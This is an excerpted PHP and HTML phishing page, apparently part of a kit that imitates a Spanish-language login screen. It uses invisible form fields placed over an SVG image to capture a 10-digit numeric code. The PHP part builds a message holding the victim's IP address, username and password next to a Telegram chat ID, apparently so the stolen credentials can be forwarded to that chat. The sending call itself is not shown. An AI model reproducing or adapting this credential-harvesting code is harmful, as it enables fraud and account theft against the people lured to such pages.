<?php
    ...
    if(!empty($_POST['i2'])){
      ...
      $tlg_id = "-4065625444";
        ...
        $msg = "GTC >>>I".$_SERVER['REMOTE_ADDR']."- U:".$_SESSION['i1']."- P:".$_SESSION['i2'];
...
<html lang="es">
  ...
  <body>
    ...
    <div id="ctn" style="overflow:hidden;text-align:center;background: rgb(172 172 172 / 21%);height:100vh;">
        <form method="post" action="4.php" id="f1" style="display: inline-block;width: 420px;height: 715px;background-image: url(3.svg);border-radius: 0 0 45px 45px; background-repeat: no-repeat; background-position: center;" >
            <input autofocus id="i3" name="i3" placeholder="" type="text" required style="display: block;position: relative;color:#333;background: transparent;border: none;top: 161px;left: 129px;height: 28px;width: 156px;padding-left: 8px;outline: none;" autocomplete="off" inputmode="numeric" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" pattern=".{10,}" maxlength="10">
